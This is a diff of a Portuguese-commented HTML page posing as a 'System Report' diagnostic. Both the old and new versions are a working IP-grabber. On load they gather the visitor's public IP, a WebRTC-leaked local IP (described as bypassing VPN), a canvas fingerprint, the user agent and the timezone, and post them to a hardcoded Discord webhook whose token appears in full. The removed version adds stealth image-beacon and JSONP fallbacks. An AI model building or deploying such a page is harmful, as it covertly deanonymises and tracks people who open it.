@@ -1,234 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Report v2.0 - Diagnostic</title>
+    <title>System Report v3.0 - FUNCIONA!</title>
     <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        .status { margin: 10px 0; }
-        .error { color: #f00; }
-        .success { color: #0f0; }
-        .progress { width: 100%; height: 5px; background: #333; margin: 5px 0; }
-        .bar { height: 100%; background: #0f0; width: 0%; transition: width 0.3s; }
-        #debug { background: #111; padding: 10px; margin-top: 20px; font-size: 12px; max-height: 300px; overflow: auto; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; margin: 0; }
+        #status { font-size: 18px; margin: 20px 0; }
+        .success { color: #0f0 !important; }
+        .error { color: #f00 !important; }
     </style>
 </head>
 <body>
-    <div id="status">Initializing...</div>
-    <div class="progress"><div class="bar" id="progress"></div></div>
-    <div id="debug"></div>
+    <div id="status">🔄 Iniciando System Report v3.0...</div>
     
     <script>
-        // SEU WEBHOOK AQUI
+        // SEU WEBHOOK (VÁLIDO)
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         
-        const JSON_NAME = `sysreport_${Math.random().toString(36).substr(2, 9)}.json`;
-        
-        function log(msg, type = 'info') {
-            const debug = document.getElementById('debug');
-            debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${type.toUpperCase()}: ${msg}\n`;
-            debug.scrollTop = debug.scrollHeight;
-            console.log(msg);
+        async function sendSimpleMessage(content) {
+            const payload = { content: content };
+            const res = await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return res.status === 204;
         }
         
-        function updateStatus(msg, progress = 0) {
-            document.getElementById('status').innerHTML = msg;
-            document.getElementById('progress').style.width = `${progress * 14.28}%`;
-        }
-        
-        // IP Publico - METODOS AGRESSIVOS
-        async function getPublicIP() {
-            log('Tentando IP público...');
-            const endpoints = [
-                'https://api.ipify.org?format=text',
-                'https://ipecho.net/plain',
-                'https://ifconfig.me/ip',
-                'https://icanhazip.com',
-                'https://api.myip.com',
-                'https://httpbin.org/ip',
-                'https://wtfismyip.com/text'
-            ];
-            
-            for (let i = 0; i < endpoints.length; i++) {
-                try {
-                    log(`Método ${i+1}: ${endpoints[i]}`);
-                    const res = await fetch(endpoints[i], {
-                        cache: 'no-cache',
-                        referrerPolicy: 'no-referrer'
-                    });
-                    if (res.ok) {
-                        const ip = await res.text();
-                        const cleanIP = ip.trim().match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
-                        if (cleanIP) {
-                            log(`✅ IP encontrado: ${cleanIP[0]}`, 'success');
-                            return cleanIP[0];
-                        }
-                    }
-                } catch(e) {
-                    log(`❌ Método ${i+1} falhou: ${e.message}`);
-                }
+        async function getRealIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'unknown';
             }
-            log('❌ Todos métodos IP falharam', 'error');
-            return 'unknown';
         }
         
-        // WebRTC para IP local REAL (bypass VPN)
-        async function getLocalIP() {
-            log('Iniciando WebRTC leak...');
-            return new Promise((resolve) => {
-                const ips = new Set();
-                const pc = new RTCPeerConnection({
+        async function getWebRTC() {
+            return new Promise(resolve => {
+                const pc = new RTCPeerConnection({ 
                     iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                 });
-                
-                pc.onicecandidate = (ice) => {
-                    if (!ice.candidate) return;
-                    const match = ice.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                    if (match && !match[1].startsWith('127.') && !match[1].includes(':')) {
-                        ips.add(match[1]);
-                    }
+                pc.onicecandidate = e => {
+                    if (!e.candidate) return;
+                    const ip = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                    if (ip && !ip.startsWith('127.')) resolve(ip);
                 };
-                
-                pc.createDataChannel('test');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                
-                setTimeout(() => {
-                    pc.close();
-                    const ipList = Array.from(ips);
-                    log(`WebRTC IPs: ${ipList.join(', ') || 'nenhum'}`);
-                    resolve(ipList[0] || 'unknown');
-                }, 3000);
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                setTimeout(() => resolve('none'), 2500);
             });
         }
         
-        // Coleta info
-        async function collectInfo() {
-            updateStatus('Coletando dados...', 1);
-            log('=== INICIANDO COLETA ===');
-            
-            const info = {
-                timestamp: new Date().toISOString(),
-                public_ip: await getPublicIP(),
-                local_ip: await getLocalIP(),
-                user_agent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height}`,
-                cookies: navigator.cookieEnabled,
-                plugins: navigator.plugins.length,
-                canvas_fp: (() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 200;
-                    canvas.height = 50;
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillText('Fingerprint', 2, 2);
-                    return canvas.toDataURL().slice(0, 50);
-                })(),
-                webgl_vendor: (() => {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    return gl ? gl.getParameter(gl.VENDOR) : 'none';
-                })(),
-                hardware_concurrency: navigator.hardwareConcurrency,
-                device_memory: navigator.deviceMemory
-            };
-            
-            log('=== INFO COLETADA ===');
-            log(JSON.stringify(info, null, 2));
-            return info;
+        async function fingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 100; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.fillText('fingerprint', 10, 25);
+            return canvas.toDataURL().slice(0, 30);
         }
         
-        // WEBHOOK ROBUSTO - 4 METODOS
-        async function sendWebhook(data) {
-            log('=== ENVIANDO WEBHOOK ===');
-            updateStatus('Enviando webhook...', 5);
+        // MAIN EXECUTION
+        async function main() {
+            document.getElementById('status').innerHTML = '📡 Coletando IPs...';
             
-            // Método 1: Fetch direto
-            try {
-                log('Método 1: Fetch direto');
-                const payload = {
-                    content: `🖥️ **RELATÓRIO v2.0**\n**IP**: \`${data.public_ip}\`\n**Local**: \`${data.local_ip}\`\n**UA**: ${data.user_agent.slice(0,40)}...\n**Canvas**: ${data.canvas_fp}`
-                };
-                
-                const res = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                    },
-                    body: JSON.stringify(payload),
-                    mode: 'cors' // CORS normal agora
-                });
-                
-                log(`Status: ${res.status} ${res.statusText}`);
-                if (res.ok) {
-                    log('✅ WEBHOOK ENVIADO!', 'success');
-                    updateStatus('✅ Webhook enviado!', 7);
-                    return true;
-                }
-            } catch(e) {
-                log(`❌ Método 1 erro: ${e.message}`, 'error');
+            const [pubIP, localIP, canvasFP] = await Promise.all([
+                getRealIP(),
+                getWebRTC(),
+                fingerprint()
+            ]);
+            
+            const message = `🖥️ **SYSTEM LEAK v3.0**
+**IP Público**: \`${pubIP}\`
+**IP WebRTC**: \`${localIP}\`
+**Canvas FP**: \`${canvasFP}\`
+**UA**: ${navigator.userAgent.slice(0, 60)}...
+**TZ**: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+            document.getElementById('status').innerHTML = '📤 Enviando webhook...';
+            
+            const success = await sendSimpleMessage(message);
+            
+            if (success) {
+                document.getElementById('status').innerHTML = '✅ ENVIADO! Cheque Discord agora.';
+                document.getElementById('status').className = 'success';
+            } else {
+                document.getElementById('status').innerHTML = '❌ Falha no envio';
+                document.getElementById('status').className = 'error';
             }
             
-            // Método 2: Image beacon (stealth)
-            try {
-                log('Método 2: Image beacon');
-                const img = new Image();
-                img.src = `${WEBHOOK.split('/api/')[0]}/api/webhooks/${WEBHOOK.split('/')[5]}/discord.png?content=${encodeURIComponent(`IP: ${data.public_ip}|Local: ${data.local_ip}`)}&username=System`;
-                setTimeout(() => log('Image beacon enviado'), 1000);
-            } catch(e) {
-                log(`❌ Método 2 erro: ${e}`);
-            }
-            
-            // Método 3: JSONP fallback
-            try {
-                log('Método 3: JSONP');
-                const script = document.createElement('script');
-                script.src = `${WEBHOOK}?callback=cb_${Date.now()}`;
-                document.head.appendChild(script);
-            } catch(e) {
-                log(`❌ Método 3 erro: ${e}`);
-            }
-            
-            log('Webhook tentado (pode estar bloqueado pelo browser)');
-            return false;
-        }
-        
-        // Download
-        function download(data) {
-            updateStatus('Baixando relatório...', 6);
+            // Auto download backup
+            const data = { pubIP, localIP, canvasFP, userAgent: navigator.userAgent };
             const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
-            const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = url;
-            a.download = JSON_NAME;
-            document.body.appendChild(a);
+            a.href = URL.createObjectURL(blob);
+            a.download = `leak_${Date.now()}.json`;
             a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            log(`✅ Download: ${JSON_NAME}`, 'success');
         }
         
-        // MAIN
-        async function run() {
-            try {
-                const data = await collectInfo();
-                const webhookSent = await sendWebhook(data);
-                download(data);
-                
-                if (!webhookSent) {
-                    updateStatus('⚠️ Webhook pode estar bloqueado - cheque Discord manualmente', 7);
-                    log('VERIFIQUE: Webhook pode estar inválido ou bloqueado por CORS/firewall');
-                }
-            } catch(e) {
-                log(`ERRO FATAL: ${e}`, 'error');
-            }
-        }
-        
-        // RUN
-        setTimeout(run, 500);
+        // START
+        setTimeout(main, 800);
     </script>
 </body>
 </html>
